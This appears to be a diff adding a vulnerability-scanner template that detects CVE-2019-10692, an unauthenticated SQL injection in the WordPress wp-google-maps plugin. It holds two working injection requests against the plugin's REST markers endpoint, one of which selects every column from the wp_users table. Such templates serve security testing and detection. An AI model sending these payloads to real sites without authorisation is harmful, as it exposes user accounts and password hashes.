@@ -1,0 +1,36 @@
+id: CVE-2019-10692
+info:
+  name: WordPress wp-google-maps plugin SQL injection vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The wp-google-maps plugin is a plugin that provides simple code to customize Google Maps quickly and easily. An input validation error vulnerability exists in the includes/class.rest-api.php file in the WordPress wp-google-maps plugin version prior to 7.11.18. The vulnerability stems from the network system or product not properly validating the entered data.
+  tags: sql-injection
+  reference:
+    - https://wpscan.com/vulnerability/475404ce-2a1a-4d15-bf02-df0ea2afdaea
+  classification:
+    cve-id: CVE-2019-10692
+    cvss-metrics: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        GET /?rest_route=/wpgmza/v1/markers&filter={}&fields=md5(0x5c)--%20- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "28d397e87306b8631f3ed80d858d35f0"
+  - raw:
+      - |
+        GET /?rest_route=/wpgmza/v1/markers&filter={}&fields=user(),%2a%20from%20wp_users--%20- HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
